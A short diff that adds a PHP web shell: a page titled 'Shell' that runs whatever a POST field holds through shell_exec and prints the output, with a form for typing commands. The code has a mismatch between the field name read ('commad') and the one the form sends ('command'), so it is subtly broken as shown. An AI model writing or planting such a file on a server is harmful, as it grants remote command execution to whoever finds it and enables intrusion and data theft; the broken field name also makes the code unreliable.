@@ -1,0 +1,17 @@
+<?php
+	if(isset($_POST['commad'])){
+		$cmd = $_POST['commad'];
+		$cmd = shell_exec($cmd);
+		echo '<pre>'.$cmd.'</pre>';
+	}
+?>
+
+<html>
+	<head>
+		<title> Shell </title>
+	</head>
+	<body>
+		<form method="post" >
+			<p>command : <input type="text" name="command" /> </p>
+		</form>
+	</body>
